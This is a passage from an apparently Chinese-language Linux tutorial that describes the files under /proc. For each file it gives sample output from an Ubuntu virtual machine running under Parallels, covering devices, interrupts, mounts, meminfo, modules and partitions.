: passed internal : no type : ahash async : yes blocksize : 16 digestsize : 16 ....../devices devices — 系统已经加载的所有块设备和字符设备的信息，包含主设备号和设备组（与主设备号对应的设备类型）名；\nparallels@ubuntu:~/Documents$ sudo cat /proc/devices Character devices: 1 mem 4 /dev/vc/0 4 tty 4 ttyS 5 /dev/tty 5 /dev/console 5 /dev/ptmx 5 ttyprintk 6 lp 7 vcs 10 misc 13 input 21 sg 29 fb 81 video4linux 89 i2c 99 ppdev 108 ppp 116 alsa 128 ptm 136 pts 180 usb 189 usb_device 204 ttyMAX 226 drm 238 media 239 aux 240 cec 241 BaseRemoteCtl 242 hidraw 243 vfio 244 bsg 245 watchdog 246 ptp 247 pps 248 rtc 249 dma_heap 250 dax 251 dimmctl 252 ndctl 253 tpm 254 gpiochip Block devices: 7 loop 8 sd 9 md 11 sr 65 sd 66 sd 67 sd 68 sd 69 sd 70 sd 71 sd 128 sd 129 sd 130 sd 131 sd 132 sd 133 sd 134 sd 135 sd 253 device-mapper 254 mdp 259 blkext/diskstats diskstats — 每块磁盘设备的磁盘I/O统计信息列表；（内核2.5.69以后的版本支持此功能）\nparallels@ubuntu:~/Documents$ sudo cat /proc/diskstats 7 0 loop0 43 0 690 13 0 0 0 0 0 56 13 0 0 0 0 0 0 7 1 loop1 382 0 10194 124 0 0 0 0 0 720 124 0 0 0 0 0 0 7 2 loop2 955 0 14846 150 0 0 0 0 0 968 150 0 0 0 0 0 0 7 3 loop3 43 0 696 16 0 0 0 0 0 32 16 0 0 0 0 0 0 7 4 loop4 55 0 2142 26 0 0 0 0 0 76 26 0 0 0 0 0 0 7 5 loop5 461 0 28720 115 0 0 0 0 0 1492 115 0 0 0 0 0 0 7 6 loop6 43 0 696 9 0 0 0 0 0 44 9 0 0 0 0 0 0 7 7 loop7 1433 0 27754 238 0 0 0 0 0 1928 238 0 0 0 0 0 0 8 0 sda 20271 9379 1610136 13409 20326 33553 2200738 29558 0 29804 43439 0 0 0 0 2943 471 8 1 sda1 164 1013 13014 32 3 0 10 0 0 84 32 0 0 0 0 0 0 8 2 sda2 2 0 4 0 0 0 0 0 0 8 0 0 0 0 0 0 0 8 5 sda5 20002 8366 1592930 13355 19597 33553 2200728 29500 0 29720 42856 0 0 0 0 0 0 11 0 sr0 11 0 5 1 0 0 0 0 0 24 1 0 0 0 0 0 0 7 8 loop8 2468 0 14116 193 0 0 0 0 0 1184 193 0 0 0 0 0 0 7 9 loop9 43 0 694 6 0 0 0 0 0 20 6 0 0 0 0 0 0 7 10 loop10 34 0 92 12 0 0 0 0 0 48 12 0 0 0 0 0 0/dma dma — 每个正在使用且注册的ISA DMA通道的信息列表；\nparallels@ubuntu:~/Documents$ cat /proc/dma 4: cascade/execdomains execdomains — 内核当前支持的执行域（每种操作系统独特“个性”）信息列表；\nparallels@ubuntu:~/Documents$ cat /proc/execdomains 0-0 Linux [kernel]/fb fb — 帧缓冲设备列表文件，包含帧缓冲设备的设备号和相关驱动信息；\nparallels@ubuntu:~/Documents$ cat /proc/fb 0 prldrmfb/filesystems filesystems — 当前被内核支持的文件系统类型列表文件，被标示为nodev的文件系统表示不需要块设备的支持；通常mount一个设备时，如果没有指定文件系统类型将通过此文件来决定其所需文件系统的类型；\nparallels@ubuntu:~/Documents$ cat /proc/filesystems nodev sysfs nodev tmpfs nodev bdev nodev proc nodev cgroup nodev cgroup2 nodev cpuset nodev devtmpfs nodev configfs nodev debugfs nodev tracefs nodev securityfs nodev sockfs nodev bpf nodev pipefs nodev ramfs nodev hugetlbfs nodev devpts ext3 ext2 ext4 squashfs vfat nodev ecryptfs fuseblk nodev fuse nodev fusectl nodev mqueue nodev pstore nodev autofs nodev prl_fs/interrupts interrupts — X86或X86_64体系架构系统上每个IRQ相关的中断号列表；多路处理器平台上每个CPU对于每个I/O设备均有自己的中断号；\nparallels@ubuntu:~/Documents$ cat /proc/interrupts CPU0 CPU1 0: 5 0 IO-APIC 2-edge timer 1: 0 2115 IO-APIC 1-edge i8042 8: 1 0 IO-APIC 8-edge rtc0 9: 0 54300 IO-APIC 9-fasteoi acpi 12: 144 0 IO-APIC 12-edge i8042 14: 0 0 IO-APIC 14-edge ata_piix 15: 0 0 IO-APIC 15-edge ata_piix 18: 4012 2072 IO-APIC 18-fasteoi uhci_hcd:usb2 19: 221 0 IO-APIC 19-fasteoi ehci_hcd:usb1 22: 0 0 IO-APIC 22-fasteoi virtio1 25: 0 22667 PCI-MSI 49152-edge prl_tg 26: 16 12 PCI-MSI 81920-edge virtio0-config 27: 2970 3763 PCI-MSI 81921-edge virtio0-input.0 28: 5404 4730 PCI-MSI 81922-edge virtio0-output.0 29: 4 39 PCI-MSI 487424-edge xhci_hcd 30: 35057 20716 PCI-MSI 512000-edge ahci[0000:00:1f.2] 31: 7106 12055 PCI-MSI 524288-edge prl_drm 32: 10323 0 PCI-MSI 516096-edge snd_hda_intel:card0 NMI: 0 0 Non-maskable interrupts LOC: 3819832 2976992 Local timer interrupts SPU: 0 0 Spurious interrupts PMI: 0 0 Performance monitoring interrupts IWI: 0 4 IRQ work interrupts RTR: 0 0 APIC ICR read retries RES: 401643 455360 Rescheduling interrupts CAL: 168695 247341 Function call interrupts TLB: 5109 4875 TLB shootdowns TRM: 0 0 Thermal event interrupts THR: 0 0 Threshold APIC interrupts DFR: 0 0 Deferred Error APIC interrupts MCE: 0 0 Machine check exceptions MCP: 92 92 Machine check polls ERR: 0 MIS: 0 PIN: 0 0 Posted-interrupt notification event NPI: 0 0 Nested posted-interrupt event PIW: 0 0 Posted-interrupt wakeup event/iomem iomem — 每个物理设备上的记忆体（RAM或者ROM）在系统内存中的映射信息；\nparallels@ubuntu:~/Documents$ cat /proc/iomem 00000000-00000000 : Reserved 00000000-00000000 : System RAM 00000000-00000000 : Reserved 00000000-00000000 : PCI Bus 0000:00 00000000-00000000 : PCI Bus 0000:00 00000000-00000000 : Video ROM 00000000-00000000 : Adapter ROM 00000000-00000000 : Reserved 00000000-00000000 : System ROM 00000000-00000000 : System RAM 00000000-00000000 : Kernel code 00000000-00000000 : Kernel rodata 00000000-00000000 : Kernel data 00000000-00000000 : Kernel bss 00000000-00000000 : Reserved 00000000-00000000 : ACPI Tables 00000000-00000000 : ACPI Non-volatile Storage 00000000-00000000 : PCI Bus 0000:00 00000000-00000000 : PCI Bus 0000:01 00000000-00000000 : 0000:01:00.0 00000000-00000000 : PCI Bus 0000:02 00000000-00000000 : PCI Bus 0000:03 00000000-00000000 : PCI Bus 0000:01 00000000-00000000 : 0000:01:00.0 00000000-00000000 : 0000:01:00.0 00000000-00000000 : 0000:00:05.0 00000000-00000000 : PCI Bus 0000:02 00000000-00000000 : 0000:00:1d.6 00000000-00000000 : xhci-hcd 00000000-00000000 : 0000:00:1d.7 00000000-00000000 : ehci_hcd 00000000-00000000 : PCI Bus 0000:03 00000000-00000000 : 0000:00:1f.2 00000000-00000000 : ahci 00000000-00000000 : 0000:00:1f.3 00000000-00000000 : 0000:00:1f.4 00000000-00000000 : ICH HD audio 00000000-00000000 : PCI MMCONFIG 0000 [bus 00-0f] 00000000-00000000 : pnp 00:04 00000000-00000000 : Reserved 00000000-00000000 : IOAPIC 0 00000000-00000000 : Reserved 00000000-00000000 : HPET 1 00000000-00000000 : PNP0103:00 00000000-00000000 : Reserved 00000000-00000000 : Local APIC 00000000-00000000 : Reserved 00000000-00000000 : INT0800:00 00000000-00000000 : Reserved 00000000-00000000 : System RAM/ioports ioports — 当前正在使用且已经注册过的与物理设备进行通讯的输入-输出端口范围信息列表；如下面所示，第一列表示注册的I/O端口范围，其后表示相关的设备；\nparallels@ubuntu:~/Documents$ cat /proc/ioports 0000-0000 : PCI Bus 0000:00 0000-0000 : dma1 0000-0000 : pic1 0000-0000 : timer0 0000-0000 : timer1 0000-0000 : keyboard 0000-0000 : PNP0800:00 0000-0000 : PNP0C09:00 0000-0000 : EC data 0000-0000 : keyboard 0000-0000 : PNP0C09:00 0000-0000 : EC cmd 0000-0000 : rtc0 0000-0000 : dma page reg 0000-0000 : pic2 0000-0000 : dma2 0000-0000 : PNP0C04:00 0000-0000 : fpu 0000-0000 : 0000:00:1f.1 0000-0000 : ata_piix 0000-0000 : 0000:00:1f.1 0000-0000 : ata_piix 0000-0000 : 0000:00:1f.1 0000-0000 : ata_piix 0000-0000 : vesafb 0000-0000 : 0000:00:1f.1 0000-0000 : ata_piix 0000-0000 : pnp 00:04 0000-0000 : QEMU0001:00 0000-0000 : PCI conf1 0000-0000 : PCI Bus 0000:00 0000-0000 : 0000:00:1f.0 0000-0000 : ACPI PM1a_EVT_BLK 0000-0000 : ACPI PM1a_CNT_BLK 0000-0000 : ACPI PM_TMR 0000-0000 : ACPI PM2_CNT_BLK 0000-0000 : ACPI GPE0_BLK 0000-0000 : gpio_ich.1.auto 0000-0000 : gpio_ich 0000-0000 : gpio_ich 0000-0000 : PCI Bus 0000:01 0000-0000 : 0000:01:00.0 0000-0000 : prl_drm 0000-0000 : 0000:00:03.0 0000-0000 : prl_tg 0000-0000 : 0000:00:05.0 0000-0000 : virtio-pci-legacy 0000-0000 : PCI Bus 0000:02 0000-0000 : 0000:00:0e.0 0000-0000 : virtio-pci-legacy 0000-0000 : 0000:00:1d.0 0000-0000 : uhci_hcd 0000-0000 : PCI Bus 0000:03 0000-0000 : 0000:00:1f.1 0000-0000 : ata_piix 0000-0000 : 0000:00:1f.2 0000-0000 : ahci 0000-0000 : 0000:00:1f.2 0000-0000 : ahci 0000-0000 : 0000:00:1f.2 0000-0000 : ahci 0000-0000 : 0000:00:1f.2 0000-0000 : ahci 0000-0000 : 0000:00:1f.2 0000-0000 : ahci 0000-0000 : 0000:00:1f.3 0000-0000 : i801_smbus/kallsyms kallsyms — 模块管理工具用来动态链接或绑定可装载模块的符号定义，由内核输出；（内核2.5.71以后的版本支持此功能）；通常这个文件中的信息量相当大；\n...... 0000000000000000 t prl_vid_probe.cold [prl_vid] 0000000000000000 r __FUNCTION__.42603 [prl_vid] 0000000000000000 d version [prl_vid] 0000000000000000 d prl_vid_pci_driver [prl_vid] 0000000000000000 t prl_vid_cleanup_module [prl_vid] 0000000000000000 d prl_vid_pci_tbl [prl_vid] 0000000000000000 r __param_usedrm [prl_vid] 0000000000000000 r __param_str_usedrm [prl_vid] 0000000000000000 t prl_drm_activate_svga_ioctl [prl_vid] 0000000000000000 t prl_drm_get_memsize_ioctl [prl_vid] 0000000000000000 t prl_drm_irq_handler [prl_vid] 0000000000000000 t prl_kms_connector_atomic_get_property [prl_vid] 0000000000000000 t prl_kms_connector_atomic_set_property [prl_vid] 0000000000000000 t prl_kms_connector_set_property [prl_vid] 0000000000000000 t prl_kms_connector_detect [prl_vid] 0000000000000000 t prl_kms_connector_dpms [prl_vid] 0000000000000000 t prl_kms_crtc_helper_atomic_begin [prl_vid] 0000000000000000 t prl_kms_crtc_helper_atomic_check [prl_vid] 0000000000000000 t prl_kms_crtc_helper_commit [prl_vid] 0000000000000000 t prl_kms_crtc_helper_prepare [prl_vid] 0000000000000000 t prl_kms_crtc_helper_disable [prl_vid] 0000000000000000 t prl_kms_crtc_helper_mode_set_nofb [prl_vid] 0000000000000000 t prl_kms_crtc_gamma_set [prl_vid] ....../kcore kcore — 系统使用的物理内存，以ELF核心文件（core file）格式存储，其文件大小为已使用的物理内存（RAM）加上4KB；这个文件用来检查内核数据结构的当前状态，因此，通常由GBD通常调试工具使用，但不能使用文件查看命令打开此文件；\n/kmsg kmsg — 此文件用来保存由内核输出的信息，通常由/sbin/klogd或/bin/dmsg等程序使用，不要试图使用查看命令打开此文件；\n/loadavg loadavg — 保存关于CPU和磁盘I/O的负载平均值，其前三列分别表示每1秒钟、每5秒钟及每15秒的负载平均值，类似于uptime命令输出的相关信息；第四列是由斜线隔开的两个数值，前者表示当前正由内核调度的实体（进程和线程）的数目，后者表示系统当前存活的内核调度实体的数目；第五列表示此文件被查看前最近一个由内核创建的进程的PID；\n/locks locks — 保存当前由内核锁定的文件的相关信息，包含内核内部的调试数据；每个锁定占据一行，且具有一个惟一的编号；如下输出信息中每行的第二列表示当前锁定使用的锁定类别，POSIX表示目前较新类型的文件锁，由lockf系统调用产生，FLOCK是传统的UNIX文件锁，由flock系统调用产生；第三列也通常由两种类型，ADVISORY表示不允许其他用户锁定此文件，但允许读取，MANDATORY表示此文件锁定期间不允许其他用户任何形式的访问；\nparallels@ubuntu:~/Documents$ sudo cat /proc/locks 1: POSIX ADVISORY READ 19994 08:05:1052576 128 128 2: POSIX ADVISORY READ 19994 08:05:1052045 1073741826 1073742335 3: FLOCK ADVISORY WRITE 849 00:1c:7 0 EOF 4: POSIX ADVISORY WRITE 744 00:19:786 0 EOF 5: FLOCK ADVISORY WRITE 560 00:19:706 0 EOF 6: FLOCK ADVISORY WRITE 44692 00:37:46 0 EOF/mdstat mdstat — 保存RAID相关的多块磁盘的当前状态信息，在没有使用RAID机器上，其显示为如下状态：\nparallels@ubuntu:~/Documents$ sudo cat /proc/mdstat Personalities : unused devices: \u003cnone\u003e/meminfo meminfo — 系统中关于当前内存的利用状况等的信息，常由free命令使用；可以使用文件查看命令直接读取此文件，其内容显示为两列，前者为统计属性，后者为对应的值；\nparallels@ubuntu:~/Documents$ sudo cat /proc/meminfo MemTotal: 4023368 kB MemFree: 1633600 kB MemAvailable: 2665656 kB Buffers: 68720 kB Cached: 1121116 kB SwapCached: 0 kB Active: 1611916 kB Inactive: 480120 kB Active(anon): 903376 kB Inactive(anon): 2396 kB Active(file): 708540 kB Inactive(file): 477724 kB Unevictable: 0 kB Mlocked: 0 kB SwapTotal: 2097148 kB SwapFree: 2097148 kB Dirty: 152 kB Writeback: 0 kB AnonPages: 902196 kB Mapped: 246020 kB Shmem: 3576 kB KReclaimable: 103668 kB Slab: 209292 kB SReclaimable: 103668 kB SUnreclaim: 105624 kB KernelStack: 10108 kB PageTables: 16764 kB NFS_Unstable: 0 kB Bounce: 0 kB WritebackTmp: 0 kB CommitLimit: 4108832 kB Committed_AS: 5164156 kB VmallocTotal: 34359738367 kB VmallocUsed: 29024 kB VmallocChunk: 0 kB Percpu: 30592 kB HardwareCorrupted: 0 kB AnonHugePages: 0 kB ShmemHugePages: 0 kB ShmemPmdMapped: 0 kB FileHugePages: 0 kB FilePmdMapped: 0 kB HugePages_Total: 0 HugePages_Free: 0 HugePages_Rsvd: 0 HugePages_Surp: 0 Hugepagesize: 2048 kB Hugetlb: 0 kB DirectMap4k: 255920 kB DirectMap2M: 3938304 kB/mounts（重点） mounts — 在内核2.4.29版本以前，此文件的内容为系统当前挂载的所有文件系统，在2.4.19以后的内核中引进了每个进程使用独立挂载名称空间的方式，此文件则随之变成了指向/proc/self/mounts（每个进程自身挂载名称空间中的所有挂载点列表）文件的符号链接；/proc/self是一个独特的目录，后文中会对此目录进行介绍；\n[root@rhel5 ~]# ll /proc |grep mounts\n如下所示，其中第一列表示挂载的设备，第二列表示在当前目录树中的挂载点，第三点表示当前文件系统的类型，第四列表示挂载属性（ro或者rw），第五列和第六列用来匹配/etc/mtab文件中的转储（dump）属性；\n[root@rhel5 ~]# more /proc/mounts\nparallels@ubuntu:~/Documents$ sudo cat /proc/mounts sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0 proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0 udev /dev devtmpfs rw,nosuid,noexec,relatime,size=1981872k,nr_inodes=495468,mode=755 0 0 devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000 0 0 tmpfs /run tmpfs rw,nosuid,nodev,noexec,relatime,size=402340k,mode=755 0 0 /dev/sda5 / ext4 rw,relatime,errors=remount-ro 0 0 securityfs /sys/kernel/security securityfs rw,nosuid,nodev,noexec,relatime 0 0 tmpfs /dev/shm tmpfs rw,nosuid,nodev 0 0 tmpfs /run/lock tmpfs rw,nosuid,nodev,noexec,relatime,size=5120k 0 0 tmpfs /sys/fs/cgroup tmpfs ro,nosuid,nodev,noexec,mode=755 0 0 cgroup2 /sys/fs/cgroup/unified cgroup2 rw,nosuid,nodev,noexec,relatime,nsdelegate 0 0 cgroup /sys/fs/cgroup/systemd cgroup rw,nosuid,nodev,noexec,relatime,xattr,name=systemd 0 0 pstore /sys/fs/pstore pstore rw,nosuid,nodev,noexec,relatime 0 0 none /sys/fs/bpf bpf rw,nosuid,nodev,noexec,relatime,mode=700 0 0 cgroup /sys/fs/cgroup/net_cls,net_prio cgroup rw,nosuid,nodev,noexec,relatime,net_cls,net_prio 0 0 cgroup /sys/fs/cgroup/freezer cgroup rw,nosuid,nodev,noexec,relatime,freezer 0 0 cgroup /sys/fs/cgroup/cpuset cgroup rw,nosuid,nodev,noexec,relatime,cpuset 0 0 cgroup /sys/fs/cgroup/blkio cgroup rw,nosuid,nodev,noexec,relatime,blkio 0 0 cgroup /sys/fs/cgroup/cpu,cpuacct cgroup rw,nosuid,nodev,noexec,relatime,cpu,cpuacct 0 0 cgroup /sys/fs/cgroup/hugetlb cgroup rw,nosuid,nodev,noexec,relatime,hugetlb 0 0 cgroup /sys/fs/cgroup/perf_event cgroup rw,nosuid,nodev,noexec,relatime,perf_event 0 0 cgroup /sys/fs/cgroup/rdma cgroup rw,nosuid,nodev,noexec,relatime,rdma 0 0 cgroup /sys/fs/cgroup/memory cgroup rw,nosuid,nodev,noexec,relatime,memory 0 0 cgroup /sys/fs/cgroup/devices cgroup rw,nosuid,nodev,noexec,relatime,devices 0 0 cgroup /sys/fs/cgroup/pids cgroup rw,nosuid,nodev,noexec,relatime,pids 0 0 systemd-1 /proc/sys/fs/binfmt_misc autofs rw,relatime,fd=28,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=18064 0 0 hugetlbfs /dev/hugepages hugetlbfs rw,relatime,pagesize=2M 0 0 mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0 debugfs /sys/kernel/debug debugfs rw,nosuid,nodev,noexec,relatime 0 0 tracefs /sys/kernel/tracing tracefs rw,nosuid,nodev,noexec,relatime 0 0 fusectl /sys/fs/fuse/connections fusectl rw,nosuid,nodev,noexec,relatime 0 0 configfs /sys/kernel/config configfs rw,nosuid,nodev,noexec,relatime 0 0 /dev/loop0 /snap/core18/1885 squashfs ro,nodev,relatime 0 0 /dev/loop1 /snap/core18/2066 squashfs ro,nodev,relatime 0 0 /dev/loop2 /snap/gnome-3-34-1804/66 squashfs ro,nodev,relatime 0 0 /dev/loop3 /snap/gtk-common-themes/1506 squashfs ro,nodev,relatime 0 0 /dev/loop4 /snap/gnome-3-34-1804/36 squashfs ro,nodev,relatime 0 0 /dev/loop5 /snap/snapd/11841 squashfs ro,nodev,relatime 0 0 /dev/loop6 /snap/snap-store/467 squashfs ro,nodev,relatime 0 0 /dev/loop7 /snap/snap-store/518 squashfs ro,nodev,relatime 0 0 /dev/loop8 /snap/gtk-common-themes/1515 squashfs ro,nodev,relatime 0 0 /dev/sda1 /boot/efi vfat rw,relatime,fmask=0077,dmask=0077,codepage=437,iocharset=iso8859-1,shortname=mixed,errors=remount-ro 0 0 Home /media/psf/Home prl_fs rw,sync,nosuid,nodev,noatime,ttl=250,share 0 0 HRSword_Installer /media/psf/HRSword_Installer prl_fs rw,sync,nosuid,nodev,noatime,ttl=250,share 0 0 iCloud /media/psf/iCloud prl_fs rw,sync,nosuid,nodev,noatime,ttl=250,share 0 0 tmpfs /run/user/1000 tmpfs rw,nosuid,nodev,relatime,size=402336k,mode=700,uid=1000,gid=1000 0 0 tmpfs /run/snapd/ns tmpfs rw,nosuid,nodev,noexec,relatime,size=402340k,mode=755 0 0 nsfs /run/snapd/ns/snap-store.mnt nsfs rw 0 0 tmpfs /run/user/125 tmpfs rw,nosuid,nodev,relatime,size=402336k,mode=700,uid=125,gid=130 0 0 gvfsd-fuse /run/user/125/gvfs fuse.gvfsd-fuse rw,nosuid,nodev,relatime,user_id=125,group_id=130 0 0 gvfsd-fuse /run/user/1000/gvfs fuse.gvfsd-fuse rw,nosuid,nodev,relatime,user_id=1000,group_id=1000 0 0 /dev/fuse /run/user/1000/doc fuse rw,nosuid,nodev,relatime,user_id=1000,group_id=1000 0 0 /dev/loop10 /snap/snapd/12057 squashfs ro,nodev,relatime 0 0/modules modules — 当前装入内核的所有模块名称列表，可以由lsmod命令使用，也可以直接查看；如下所示，其中第一列表示模块名，第二列表示此模块占用内存空间大小，第三列表示此模块有多少实例被装入，第四列表示此模块依赖于其它哪些模块，第五列表示此模块的装载状态（Live：已经装入；Loading：正在装入；Unloading：正在卸载），第六列表示此模块在内核内存（kernel memory）中的偏移量；\nparallels@ubuntu:~/Documents$ lsmod Module Size Used by usblp 24576 0 prl_fs_freeze 16384 0 prl_fs 28672 3 prl_eth 16384 0 nls_iso8859_1 16384 1 snd_hda_codec_generic 81920 1 ledtrig_audio 16384 1 snd_hda_codec_generic snd_hda_intel 53248 9 snd_intel_dspcfg 24576 1 snd_hda_intel snd_hda_codec 139264 2 snd_hda_codec_generic,snd_hda_intel snd_hda_core 94208 3 snd_hda_codec_generic,snd_hda_intel,snd_hda_codec snd_hwdep 20480 1 snd_hda_codec snd_pcm 114688 4 snd_hda_intel,snd_hda_codec,snd_hda_core snd_seq_midi 20480 0 snd_seq_midi_event 16384 1 snd_seq_midi snd_rawmidi 36864 1 snd_seq_midi snd_seq 69632 2 snd_seq_midi,snd_seq_midi_event intel_rapl_msr 20480 0 intel_rapl_common 28672 1 intel_rapl_msr x86_pkg_temp_thermal 20480 0 coretemp 20480 0 crct10dif_pclmul 16384 1 ghash_clmulni_intel 16384 0 snd_seq_device 16384 3 snd_seq,snd_seq_midi,snd_rawmidi snd_timer 40960 3 snd_seq,snd_pcm aesni_intel 372736 0 crypto_simd 16384 1 aesni_intel cryptd 24576 2 crypto_simd,ghash_clmulni_intel glue_helper 16384 1 aesni_intel rapl 20480 0 snd 94208 25 snd_hda_codec_generic,snd_seq,snd_seq_device,snd_hwdep,snd_hda_intel,snd_hda_codec,snd_timer,snd_pcm,snd_rawmidi uvcvideo 98304 0 videobuf2_vmalloc 20480 1 uvcvideo input_leds 16384 0 videobuf2_memops 20480 1 videobuf2_vmalloc videobuf2_v4l2 24576 1 uvcvideo soundcore 16384 1 snd serio_raw 20480 0 videobuf2_common 57344 2 videobuf2_v4l2,uvcvideo videodev 241664 3 videobuf2_v4l2,uvcvideo,videobuf2_common joydev 24576 0 sbs 20480 0 mc 57344 4 videodev,videobuf2_v4l2,uvcvideo,videobuf2_common sbshc 16384 1 sbs mac_hid 16384 0 pvpanic 16384 0 sch_fq_codel 20480 2 parport_pc 45056 0 ppdev 24576 0 lp 20480 0 parport 65536 3 parport_pc,lp,ppdev ip_tables 32768 0 x_tables 49152 1 ip_tables autofs4 45056 2 prl_vid 53248 7 drm_kms_helper 217088 1 prl_vid gpio_ich 16384 0 syscopyarea 16384 1 drm_kms_helper sysfillrect 16384 1 drm_kms_helper sysimgblt 16384 1 drm_kms_helper fb_sys_fops 16384 1 drm_kms_helper cec 53248 1 drm_kms_helper rc_core 57344 1 cec crc32_pclmul 16384 0 drm 552960 9 drm_kms_helper,prl_vid i2c_i801 32768 0 i2c_smbus 20480 1 i2c_i801 psmouse 155648 0 ahci 40960 2 libahci 36864 1 ahci pata_acpi 16384 0 xhci_pci 20480 0 xhci_pci_renesas 20480 1 xhci_pci lpc_ich 24576 0 virtio_net 57344 0 net_failover 20480 1 virtio_net failover 16384 1 net_failover prl_tg 28672 17 prl_vid,prl_fs hid_generic 16384 0 usbhid 57344 0 hid 135168 2 usbhid,hid_generic parallels@ubuntu:~/Documents$ cat /proc/ Display all 312 possibilities? (y or n) parallels@ubuntu:~/Documents$ cat /proc/modules usblp 24576 0 - Live 0x0000000000000000 prl_fs_freeze 16384 0 - Live 0x0000000000000000 (POE) prl_fs 28672 3 - Live 0x0000000000000000 (POE) prl_eth 16384 0 - Live 0x0000000000000000 (POE) nls_iso8859_1 16384 1 - Live 0x0000000000000000 snd_hda_codec_generic 81920 1 - Live 0x0000000000000000 ledtrig_audio 16384 1 snd_hda_codec_generic, Live 0x0000000000000000 snd_hda_intel 53248 6 - Live 0x0000000000000000 snd_intel_dspcfg 24576 1 snd_hda_intel, Live 0x0000000000000000 snd_hda_codec 139264 2 snd_hda_codec_generic,snd_hda_intel, Live 0x0000000000000000 snd_hda_core 94208 3 snd_hda_codec_generic,snd_hda_intel,snd_hda_codec, Live 0x0000000000000000 snd_hwdep 20480 1 snd_hda_codec, Live 0x0000000000000000 snd_pcm 114688 3 snd_hda_intel,snd_hda_codec,snd_hda_core, Live 0x0000000000000000 snd_seq_midi 20480 0 - Live 0x0000000000000000 snd_seq_midi_event 16384 1 snd_seq_midi, Live 0x0000000000000000 snd_rawmidi 36864 1 snd_seq_midi, Live 0x0000000000000000 snd_seq 69632 2 snd_seq_midi,snd_seq_midi_event, Live 0x0000000000000000 intel_rapl_msr 20480 0 - Live 0x0000000000000000 intel_rapl_common 28672 1 intel_rapl_msr, Live 0x0000000000000000 x86_pkg_temp_thermal 20480 0 - Live 0x0000000000000000 coretemp 20480 0 - Live 0x0000000000000000 crct10dif_pclmul 16384 1 - Live 0x0000000000000000 ghash_clmulni_intel 16384 0 - Live 0x0000000000000000 snd_seq_device 16384 3 snd_seq_midi,snd_rawmidi,snd_seq, Live 0x0000000000000000 snd_timer 40960 2 snd_pcm,snd_seq, Live 0x0000000000000000 aesni_intel 372736 0 - Live 0x0000000000000000 crypto_simd 16384 1 aesni_intel, Live 0x0000000000000000 cryptd 24576 2 ghash_clmulni_intel,crypto_simd, Live 0x0000000000000000 glue_helper 16384 1 aesni_intel, Live 0x0000000000000000 rapl 20480 0 - Live 0x0000000000000000 snd 94208 21 snd_hda_codec_generic,snd_hda_intel,snd_hda_codec,snd_hwdep,snd_pcm,snd_rawmidi,snd_seq,snd_seq_device,snd_timer, Live 0x0000000000000000 uvcvideo 98304 0 - Live 0x0000000000000000 videobuf2_vmalloc 20480 1 uvcvideo, Live 0x0000000000000000 input_leds 16384 0 - Live 0x0000000000000000 videobuf2_memops 20480 1 videobuf2_vmalloc, Live 0x0000000000000000 videobuf2_v4l2 24576 1 uvcvideo, Live 0x0000000000000000 soundcore 16384 1 snd, Live 0x0000000000000000 serio_raw 20480 0 - Live 0x0000000000000000 videobuf2_common 57344 2 uvcvideo,videobuf2_v4l2, Live 0x0000000000000000 videodev 241664 3 uvcvideo,videobuf2_v4l2,videobuf2_common, Live 0x0000000000000000 joydev 24576 0 - Live 0x0000000000000000 sbs 20480 0 - Live 0x0000000000000000 mc 57344 4 uvcvideo,videobuf2_v4l2,videobuf2_common,videodev, Live 0x0000000000000000 sbshc 16384 1 sbs, Live 0x0000000000000000 mac_hid 16384 0 - Live 0x0000000000000000 pvpanic 16384 0 - Live 0x0000000000000000 sch_fq_codel 20480 2 - Live 0x0000000000000000 parport_pc 45056 0 - Live 0x0000000000000000 ppdev 24576 0 - Live 0x0000000000000000 lp 20480 0 - Live 0x0000000000000000 parport 65536 3 parport_pc,ppdev,lp, Live 0x0000000000000000 ip_tables 32768 0 - Live 0x0000000000000000 x_tables 49152 1 ip_tables, Live 0x0000000000000000 autofs4 45056 2 - Live 0x0000000000000000 prl_vid 53248 7 - Live 0x0000000000000000 (POE) drm_kms_helper 217088 1 prl_vid, Live 0x0000000000000000 gpio_ich 16384 0 - Live 0x0000000000000000 syscopyarea 16384 1 drm_kms_helper, Live 0x0000000000000000 sysfillrect 16384 1 drm_kms_helper, Live 0x0000000000000000 sysimgblt 16384 1 drm_kms_helper, Live 0x0000000000000000 fb_sys_fops 16384 1 drm_kms_helper, Live 0x0000000000000000 cec 53248 1 drm_kms_helper, Live 0x0000000000000000 rc_core 57344 1 cec, Live 0x0000000000000000 crc32_pclmul 16384 0 - Live 0x0000000000000000 drm 552960 9 prl_vid,drm_kms_helper, Live 0x0000000000000000 i2c_i801 32768 0 - Live 0x0000000000000000 i2c_smbus 20480 1 i2c_i801, Live 0x0000000000000000 psmouse 155648 0 - Live 0x0000000000000000 ahci 40960 2 - Live 0x0000000000000000 libahci 36864 1 ahci, Live 0x0000000000000000 pata_acpi 16384 0 - Live 0x0000000000000000 xhci_pci 20480 0 - Live 0x0000000000000000 xhci_pci_renesas 20480 1 xhci_pci, Live 0x0000000000000000 lpc_ich 24576 0 - Live 0x0000000000000000 virtio_net 57344 0 - Live 0x0000000000000000 net_failover 20480 1 virtio_net, Live 0x0000000000000000 failover 16384 1 net_failover, Live 0x0000000000000000 prl_tg 28672 17 prl_fs,prl_vid, Live 0x0000000000000000 (POE) hid_generic 16384 0 - Live 0x0000000000000000 usbhid 57344 0 - Live 0x0000000000000000 hid 135168 2 hid_generic,usbhid, Live 0x0000000000000000/partitions partition — 块设备每个分区的主设备号（major）和次设备号（minor）等信息，同时包括每个分区所包含的块（block）数目（如下面输出中第三列所示）；\nparallels@ubuntu:~/Documents$ cat /proc/partitions major minor #blocks name 7 0 56648 loop0 7 1 56752 loop1 7 2 224248 loop2 7 3 63580 loop3 7 4 261700 loop4 7 5 32856 loop5 7 6 50980 loop6 7 7 52268 loop7 8 0 67108864 sda 8 1 524288 sda1 8 2 1 sda2 8 5 66581504 sda5 11 0 1048575 sr0 7 8 66660 loop8 7 10 32872 loop10/pci pci — 内核初始化时发现的所有PCI设备及其配置信息列表，其配置信息多为某PCI设备相关IRQ信息，可读性不高，可以用“/sbin/lspci –vb”命令获得较易理解的相关信息；在2.6内核以后，此文件已为/proc/bus/pci目录及其下的文件代替；\nparallels@ubuntu:~/Documents$ sudo ls /proc/bus/pci 00 01 devices/slabinfo slabinfo — 在内核中频繁使用的对象（如inode、dentry等）都有自己的cache，即slab 